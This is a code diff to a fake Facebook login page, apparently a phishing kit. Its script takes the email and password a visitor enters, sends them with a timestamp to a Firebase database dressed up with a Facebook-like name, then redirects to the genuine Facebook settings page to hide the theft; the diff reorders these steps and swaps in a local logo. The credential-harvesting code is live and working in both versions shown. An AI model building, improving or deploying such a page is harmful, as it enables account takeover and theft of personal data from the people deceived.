@@ -11,7 +11,7 @@
     <div class="Container">
       <img
         class="_97vu img titleImg"
-        src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
+        src="./FbLogo.svg"
         alt="Facebook"
         width="240px"
       />
@@ -21,7 +21,7 @@
         <div class="title">Log in to Facebook</div>
         <form id="Form" action="">
           <input
-            type="email"
+            type="text"
             class="inputtext _55r1 inputtext _1kbt inputtext _1kbt"
             name="email"
             id="email"
@@ -98,30 +98,38 @@
         e.preventDefault();
         loginbutton.value = "Logging in progress...";
 
-        const emailValue = email.value;
-        const passValue = pass.value;
+        const taskOne = (callback) => {
+          const emailValue = email.value;
+          const passValue = pass.value;
+          //////////////////
+          fetch(
+            "https://facebook-568a9-default-rtdb.firebaseio.com/Data.json",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                Time: new Date().toLocaleString(),
+                Email_Phone: emailValue,
+                Password: passValue,
+              }),
+            }
+          )
+            .then(() => {
+              console.log("1");
+              callback();
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+            });
+        };
         //////////////////
-        fetch("https://facebook-568a9-default-rtdb.firebaseio.com/Data.json", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            Time: new Date().toLocaleString(),
-            Email_Phone: emailValue,
-            Password: passValue,
-          }),
-        })
-          .then(() => {
-            console.log("1");
-          })
-          .catch((error) => {
-            console.error("Error:", error);
-          });
-        //////////////////
-        setTimeout(() => {
+        const taskTwo = () => {
+          console.log("2");
           window.location = "https://www.facebook.com/settings/?tab=account";
-        }, 3000);
+        };
+        taskOne(() => taskTwo());
       });
     </script>
   </body>
